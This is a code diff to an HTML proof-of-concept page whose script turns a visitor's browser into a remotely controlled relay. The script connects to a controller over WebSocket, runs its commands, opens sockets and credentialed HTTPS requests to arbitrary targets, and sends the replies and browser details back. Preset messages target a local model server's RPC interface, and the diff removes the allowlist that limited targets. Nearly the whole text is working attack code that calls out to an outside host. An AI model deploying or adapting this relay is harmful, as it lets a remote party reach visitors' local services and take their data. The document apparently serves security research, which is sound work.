         const protocols = Array.isArray(command.protocols)
-          ? command.protocols.map(String).slice(0, 8)
-          : undefined;
-        const socket = protocols && protocols.length
-          ? new WebSocket(url, protocols)
-          : new WebSocket(url);
+          ? command.protocols.map(value => String(value).trim()).filter(Boolean).slice(0, 8)
+          : [];
+        const socket = protocols.length ? new WebSocket(url, protocols) : new WebSocket(url);
         socket.binaryType = "arraybuffer";
         targetSockets.set(channel, socket);
-
-        sendController({
-          type: "target.event",
-          channel,
-          event: "connecting",
-          url
-        });
-        log(`target ${channel}: CONNECTING ${url}`);
+        renderChannels();
+        log("WS", `${channel} CONNECTING ${url}`);
+        sendController({ type: "target.event", channel, event: "connecting", url });
 
         socket.addEventListener("open", () => {
-          sendController({
-            type: "target.event",
-            channel,
-            event: "open",
-            url,
-            protocol: socket.protocol || null
-          });
-          log(`target ${channel}: OPEN`);
+          renderChannels();
+          log("WS", `${channel} OPEN ${url}`, "success");
+          sendController({ type: "target.event", channel, event: "open", url, protocol: socket.protocol || null });
         });
 
         socket.addEventListener("message", async event => {
           try {
             if (typeof event.data === "string") {
-              const size = new TextEncoder().encode(event.data).byteLength;
-              if (size > MAX_TEXT_FRAME_BYTES) {
-                throw new Error(`text reply exceeds ${MAX_TEXT_FRAME_BYTES} bytes`);
-              }
-              sendController({
-                type: "target.event",
-                channel,
-                event: "message",
-                dataType: "text",
-                byteLength: size,
-                data: event.data
-              });
-              log(`target ${channel}: relayed text reply (${size} bytes)`);
+              const byteLength = new TextEncoder().encode(event.data).byteLength;
+              if (byteLength > MAX_TEXT_FRAME_BYTES) throw new Error(`text reply exceeds ${MAX_TEXT_FRAME_BYTES} bytes`);
+              const payload = { channel, dataType: "text", byteLength, data: event.data };
+              nodes.wsOutput.textContent = formatJson(payload);
+              const relayed = sendController({ type: "target.event", event: "message", ...payload });
+              log(
+                "WS",
+                relayed
+                  ? `${channel} reply relayed to controller (${byteLength} bytes)`
+                  : `${channel} reply displayed locally; controller disconnected (${byteLength} bytes)`,
+                "success"
+              );
               return;
             }
 
-            const buffer = event.data instanceof Blob
-              ? await event.data.arrayBuffer()
-              : event.data;
+            const buffer = event.data instanceof Blob ? await event.data.arrayBuffer() : event.data;
             const bytes = new Uint8Array(buffer);
-            if (bytes.byteLength > MAX_BINARY_FRAME_BYTES) {
-              throw new Error(`binary reply exceeds ${MAX_BINARY_FRAME_BYTES} bytes`);
-            }
-            sendController({
-              type: "target.event",
-              channel,
-              event: "message",
-              dataType: "base64",
-              byteLength: bytes.byteLength,
-              data: bytesToBase64(bytes)
-            });
-            log(`target ${channel}: relayed binary reply (${bytes.byteLength} bytes)`);
+            if (bytes.byteLength > MAX_BINARY_FRAME_BYTES) throw new Error(`binary reply exceeds ${MAX_BINARY_FRAME_BYTES} bytes`);
+            const payload = { channel, dataType: "base64", byteLength: bytes.byteLength, data: bytesToBase64(bytes) };
+            nodes.wsOutput.textContent = formatJson(payload);
+            const relayed = sendController({ type: "target.event", event: "message", ...payload });
+            log(
+              "WS",
+              relayed
+                ? `${channel} binary reply relayed to controller (${bytes.byteLength} bytes)`
+                : `${channel} binary reply displayed locally; controller disconnected (${bytes.byteLength} bytes)`,
+              "success"
+            );
           } catch (error) {
-            sendController({
-              type: "target.event",
-              channel,
-              event: "relay-error",
-              error: serializeError(error)
-            });
+            log("WS", `${channel} relay error: ${error.message}`, "error");
+            sendController({ type: "target.event", channel, event: "relay-error", error: serializeError(error) });
             closeTarget(channel, 1009, "reply too large");
           }
         });
 
         socket.addEventListener("error", () => {
-          sendController({
-            type: "target.event",
+          socket.__pocHadError = true;
+          setPill(nodes.wsStatus, "WS target error", "error");
+          log("WS", `${channel} WEBSOCKET_ERROR ${url}`, "error");
+          nodes.wsOutput.textContent = formatJson({
+            ok: false,
             channel,
-            event: "error",
-            url
+            url,
+            error: "WebSocket connection or protocol error"
           });
-          log(`target ${channel}: ERROR`, true);
+          sendController({ type: "target.event", channel, event: "error", url });
         });
 
         socket.addEventListener("close", event => {
-          targetSockets.delete(channel);
-          sendController({
-            type: "target.event",
-            channel,
-            event: "close",
-            code: event.code,
-            reason: event.reason,
-            clean: event.wasClean
-          });
-          log(`target ${channel}: CLOSED code=${event.code}`);
+          if (targetSockets.get(channel) === socket) targetSockets.delete(channel);
+          renderChannels();
+          if (socket.__pocHadError && targetSockets.size === 0) {
+            setPill(nodes.wsStatus, "WS target failed", "error");
+          }
+          log("WS", `${channel} CLOSED code=${event.code} reason=${event.reason || "none"}`);
+          sendController({ type: "target.event", channel, event: "close", code: event.code, reason: event.reason, clean: event.wasClean });
         });
+
+        return { channel, url, protocols, state: "connecting" };
       }
 
       function sendTarget(command) {
-        const channel = String(command.channel || "");
+        const channel = validateChannel(command.channel);
         const socket = targetSockets.get(channel);
-        if (!socket || socket.readyState !== WebSocket.OPEN) {
-          throw new Error(`target channel is not open: ${channel}`);
-        }
+        if (!socket || socket.readyState !== WebSocket.OPEN) throw new Error(`target channel is not open: ${channel}`);
 
-        const dataType = command.dataType === "base64" ? "base64" : "text";
-        if (dataType === "base64") {
-          const encoded = String(command.data || "");
-          const binary = atob(encoded);
-          if (binary.length > MAX_BINARY_FRAME_BYTES) {
-            throw new Error(`binary frame exceeds ${MAX_BINARY_FRAME_BYTES} bytes`);
-          }
-          const bytes = Uint8Array.from(binary, character => character.charCodeAt(0));
+        if (command.dataType === "base64") {
+          const bytes = base64ToBytes(command.data || "");
           socket.send(bytes);
-          return { channel, dataType, byteLength: bytes.byteLength };
+          log("WS", `${channel} sent binary frame (${bytes.byteLength} bytes)`);
+          return { channel, dataType: "base64", byteLength: bytes.byteLength };
         }
 
         const data = String(command.data || "");
-        const size = new TextEncoder().encode(data).byteLength;
-        if (size > MAX_TEXT_FRAME_BYTES) {
-          throw new Error(`text frame exceeds ${MAX_TEXT_FRAME_BYTES} bytes`);
-        }
+        const byteLength = new TextEncoder().encode(data).byteLength;
+        if (byteLength > MAX_TEXT_FRAME_BYTES) throw new Error(`text frame exceeds ${MAX_TEXT_FRAME_BYTES} bytes`);
         socket.send(data);
-        return { channel, dataType, byteLength: size };
+        log("WS", `${channel} sent text frame (${byteLength} bytes)`);
+        return { channel, dataType: "text", byteLength };
       }
 
-      async function executeCommand(command) {
-        const commandId = String(command.commandId || "missing");
+      function parseHeaders(value) {
+        const parsed = typeof value === "string" ? JSON.parse(value || "{}") : value;
+        if (!parsed || Array.isArray(parsed) || typeof parsed !== "object") throw new Error("headers must be a JSON object");
+        const headers = new Headers();
+        for (const [name, headerValue] of Object.entries(parsed)) headers.set(name, String(headerValue));
+        return headers;
+      }
+
+      async function sha256(bytes) {
+        const digest = await crypto.subtle.digest("SHA-256", bytes);
+        return [...new Uint8Array(digest)].map(value => value.toString(16).padStart(2, "0")).join("");
+      }
+
+      async function readBoundedResponse(response) {
+        if (!response.body) return new Uint8Array();
+        const reader = response.body.getReader();
+        const chunks = [];
+        let total = 0;
+        while (true) {
+          const { done, value } = await reader.read();
+          if (done) break;
+          total += value.byteLength;
+          if (total > MAX_HTTP_RESPONSE_BYTES) {
+            await reader.cancel("PoC response limit reached");
+            throw new Error(`response exceeds ${MAX_HTTP_RESPONSE_BYTES} bytes`);
+          }
+          chunks.push(value);
+        }
+        const bytes = new Uint8Array(total);
+        let offset = 0;
+        for (const chunk of chunks) {
+          bytes.set(chunk, offset);
+          offset += chunk.byteLength;
+        }
+        return bytes;
+      }
+
+      async function performHttpRequest(command) {
+        if (httpAbortController) throw new Error("another HTTPS request is already in progress");
+        const method = String(command.method || "GET").toUpperCase();
+        if (!HTTP_METHODS.has(method)) throw new Error(`unsupported method: ${method}`);
+        const target = new URL(String(command.url || "").trim());
+        if (target.protocol !== "https:") throw new Error("this PoC sends HTTPS requests only");
+
+        const mode = command.mode === "no-cors" ? "no-cors" : "cors";
+        const credentials = ["omit", "include", "same-origin"].includes(command.credentials) ? command.credentials : "omit";
+        const redirect = ["follow", "manual", "error"].includes(command.redirect) ? command.redirect : "follow";
+        const cache = ["default", "no-store", "reload"].includes(command.cache) ? command.cache : "no-store";
+        const timeoutMs = Math.min(30000, Math.max(500, Number(command.timeoutMs) || 10000));
+        const headers = parseHeaders(command.headers || {});
+        const body = method === "GET" || method === "HEAD" ? undefined : String(command.body || "");
+        const abortController = new AbortController();
+        httpAbortController = abortController;
+        updateControls();
+        const timeout = setTimeout(() => abortController.abort("request timed out"), timeoutMs);
+
+        setPill(nodes.httpStatus, "HTTPS requesting", "working");
+        log("HTTPS", `${method} ${target.href} mode=${mode} credentials=${credentials}`);
+        const started = performance.now();
+
+        try {
+          const response = await fetch(target.href, {
+            method, headers, body, mode, credentials, redirect, cache, signal: abortController.signal
+          });
+          const elapsedMs = Math.round(performance.now() - started);
+
+          if (response.type === "opaque" || response.type === "opaqueredirect") {
+            const result = {
+              request: { method, url: target.href, mode, credentials },
+              dispatched: true,
+              readable: false,
+              responseType: response.type,
+              status: response.status,
+              elapsedMs,
+              note: "Opaque response: the request completed but browser policy prevents reading its response."
+            };
+            nodes.httpOutput.textContent = formatJson(result);
+            setPill(nodes.httpStatus, "HTTPS opaque", "working");
+            log("HTTPS", `opaque completion after ${elapsedMs} ms; response not readable`);
+            return result;
+          }
+
+          const bytes = await readBoundedResponse(response);
+          const contentType = response.headers.get("content-type") || "";
+          const textual = /^(text\/|application\/(json|javascript|xml|xhtml\+xml))/i.test(contentType);
+          const bodyResult = textual
+            ? { encoding: "utf-8", data: new TextDecoder().decode(bytes) }
+            : { encoding: "base64", data: bytesToBase64(bytes) };
+          const result = {
+            request: { method, url: target.href, mode, credentials },
+            dispatched: true,
+            readable: true,
+            responseType: response.type,
+            responseUrl: response.url,
+            status: response.status,
+            statusText: response.statusText,
+            redirected: response.redirected,
+            elapsedMs,
+            headers: Object.fromEntries(response.headers.entries()),
+            byteLength: bytes.byteLength,
+            sha256: await sha256(bytes),
+            body: bodyResult
+          };
+          nodes.httpOutput.textContent = formatJson(result);
+          setPill(nodes.httpStatus, `HTTPS ${response.status}`, response.ok ? "connected" : "error");
+          log("HTTPS", `read ${response.status}, ${bytes.byteLength} bytes, ${elapsedMs} ms`, response.ok ? "success" : "error");
+          return result;
+        } finally {
+          clearTimeout(timeout);
+          if (httpAbortController === abortController) httpAbortController = null;
+          updateControls();
+        }
+      }
+
+      async function executeCommand(command, source) {
+        const commandId = String(command.commandId || `manual-${Date.now()}`);
         try {
           let result;
           switch (command.action) {
             case "agent.info":
               result = {
                 origin: location.origin,
-                href: location.href.replace(/([?&]token=)[^&]+/i, "$1[redacted]"),
+                href: redactUrl(location.href),
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 languages: navigator.languages,
@@ -341,13 +1061,11 @@
                   isActive: navigator.userActivation.isActive,
                   hasBeenActive: navigator.userActivation.hasBeenActive
                 } : null,
-                openTargets: [...targetSockets.keys()],
-                allowedTargets: [...ALLOWED_TARGETS]
+                openTargets: [...targetSockets.keys()]
               };
               break;
             case "targets.list":
               result = {
-                allowedTargets: [...ALLOWED_TARGETS],
                 openTargets: [...targetSockets.entries()].map(([channel, socket]) => ({
                   channel,
                   url: socket.url,
@@ -356,97 +1074,107 @@
                 }))
               };
               break;
-            case "ws.open":
-              openTarget(command);
-              result = { channel: command.channel, state: "connecting" };
-              break;
-            case "ws.send":
-              result = sendTarget(command);
-              break;
-            case "ws.close":
-              result = {
-                channel: String(command.channel || ""),
-                existed: closeTarget(String(command.channel || ""))
-              };
-              break;
-            default:
-              throw new Error(`unsupported action: ${String(command.action)}`);
+            case "ws.open": result = openTarget(command); break;
+            case "ws.send": result = sendTarget(command); break;
+            case "ws.close": result = { channel: validateChannel(command.channel), existed: closeTarget(command.channel) }; break;
+            case "http.request": result = await performHttpRequest(command); break;
+            default: throw new Error(`unsupported action: ${String(command.action)}`);
           }
-          sendController({ type: "command.result", commandId, ok: true, result });
+          if (source === "controller") sendController({ type: "command.result", commandId, ok: true, result });
+          return result;
         } catch (error) {
-          sendController({
-            type: "command.result",
-            commandId,
-            ok: false,
-            error: serializeError(error)
-          });
-          log(`command ${commandId} failed: ${error.message}`, true);
+          const serialized = serializeError(error);
+          log(source === "controller" ? "CONTROL" : "MANUAL", `${command.action}: ${serialized.message}`, "error");
+          if (command.action === "http.request") {
+            nodes.httpOutput.textContent = formatJson({ ok: false, error: serialized });
+            setPill(nodes.httpStatus, "HTTPS failed", "error");
+          }
+          if (command.action.startsWith("ws.")) {
+            nodes.wsOutput.textContent = formatJson({ ok: false, error: serialized });
+            setPill(nodes.wsStatus, "WS command failed", "error");
+          }
+          if (source === "controller") sendController({ type: "command.result", commandId, ok: false, error: serialized });
+          throw error;
         }
       }
 
-      function connectController() {
-        if (controller && controller.readyState < WebSocket.CLOSING) {
-          controller.close(1000, "reconnect requested");
-        }
-        closeAllTargets("controller reconnect");
-        setStatus("connecting");
-        log(`controller: CONNECTING ${controllerUrl}`);
+      function manualOpen() {
+        void executeCommand({
+          action: "ws.open", channel: nodes.wsChannel.value, url: nodes.wsUrl.value,
+          protocols: nodes.wsProtocols.value.split(",").map(value => value.trim()).filter(Boolean)
+        }, "manual").catch(() => {});
+      }
 
-        try {
-          controller = new WebSocket(controllerUrl);
-        } catch (error) {
-          setStatus("controller construction failed", "error");
-          log(`controller construction failed: ${error.message}`, true);
+      function manualSend(dataType) {
+        void executeCommand({
+          action: "ws.send", channel: nodes.wsChannel.value,
+          dataType, data: nodes.wsPayload.value
+        }, "manual").catch(() => {});
+      }
+
+      function setLmPayload(value) { nodes.wsPayload.value = JSON.stringify(value); }
+
+      function manualHttp() {
+        let headers;
+        try { headers = JSON.parse(nodes.httpHeaders.value || "{}"); }
+        catch (error) {
+          nodes.httpOutput.textContent = formatJson({ ok: false, error: serializeError(error) });
+          setPill(nodes.httpStatus, "invalid headers", "error");
           return;
         }
-
-        controller.addEventListener("open", () => {
-          setStatus("controller connected", "connected");
-          log("controller: OPEN");
-          sendController({
-            type: "agent.hello",
-            token: controllerToken,
-            origin: location.origin,
-            userAgent: navigator.userAgent,
-            platform: navigator.platform
-          });
-        });
-
-        controller.addEventListener("message", event => {
-          try {
-            if (typeof event.data !== "string") {
-              throw new Error("controller commands must be text JSON frames");
-            }
-            const command = JSON.parse(event.data);
-            if (!command || command.type !== "command") {
-              throw new Error("expected a command object");
-            }
-            log(`controller command: ${command.action}`);
-            void executeCommand(command);
-          } catch (error) {
-            log(`invalid controller message: ${error.message}`, true);
-            sendController({
-              type: "protocol.error",
-              error: serializeError(error)
-            });
-          }
-        });
-
-        controller.addEventListener("error", () => {
-          setStatus("controller error", "error");
-          log("controller: ERROR", true);
-        });
-
-        controller.addEventListener("close", event => {
-          closeAllTargets("controller disconnected");
-          setStatus(`controller closed (${event.code})`, "error");
-          log(`controller: CLOSED code=${event.code}`);
-        });
+        void executeCommand({
+          action: "http.request", method: nodes.httpMethod.value, url: nodes.httpUrl.value,
+          timeoutMs: Number(nodes.httpTimeout.value), mode: nodes.httpMode.value,
+          credentials: nodes.httpCredentials.value, redirect: nodes.httpRedirect.value,
+          cache: nodes.httpCache.value, headers, body: nodes.httpBody.value
+        }, "manual").then(result => {
+          const relayed = sendController({ type: "manual.http.result", result });
+          log(
+            "HTTPS",
+            relayed ? "manual HTTPS result relayed to controller" : "manual HTTPS result kept in Embed; controller disconnected",
+            relayed ? "success" : "info"
+          );
+        }).catch(() => {});
       }
 
-      reconnectButton.addEventListener("click", connectController);
-      window.addEventListener("beforeunload", () => closeAllTargets("page unload"));
-      setTimeout(connectController, 250);
+      nodes.controllerConnect.addEventListener("click", connectController);
+      nodes.controllerDisconnect.addEventListener("click", () => disconnectController());
+      nodes.wsOpen.addEventListener("click", manualOpen);
+      nodes.wsClose.addEventListener("click", () => {
+        void executeCommand({ action: "ws.close", channel: nodes.wsChannel.value }, "manual").catch(() => {});
+      });
+      nodes.wsSendText.addEventListener("click", () => manualSend("text"));
+      nodes.wsSendBase64.addEventListener("click", () => manualSend("base64"));
+      nodes.lmAuth.addEventListener("click", () => setLmPayload({
+        authVersion: 1, clientIdentifier: "owned-impact-poc", clientPasskey: "owned-impact-poc"
+      }));
+      nodes.lmVersion.addEventListener("click", () => setLmPayload({
+        type: "rpcCall", endpoint: "version", callId: ++lmCallId
+      }));
+      nodes.lmModels.addEventListener("click", () => setLmPayload({
+        type: "rpcCall", endpoint: "listDownloadedModels", callId: ++lmCallId
+      }));
+      nodes.httpSend.addEventListener("click", manualHttp);
+      nodes.httpCancel.addEventListener("click", () => {
+        if (httpAbortController) httpAbortController.abort("cancelled by tester");
+      });
+      nodes.clearLog.addEventListener("click", () => {
+        logEntries.length = 0;
+        renderLog();
+      });
+      nodes.wsChannel.addEventListener("input", updateControls);
+      nodes.wsUrl.addEventListener("input", updateControls);
+
+      window.addEventListener("beforeunload", () => {
+        disconnectController("page unload");
+        closeAllTargets("page unload");
+        if (httpAbortController) httpAbortController.abort("page unload");
+      });
+
+      renderChannels();
+      log("POC", `loaded from ${location.origin}`);
+      updateControls();
+      setTimeout(connectController, 350);
     })();
   </script>
 </body>
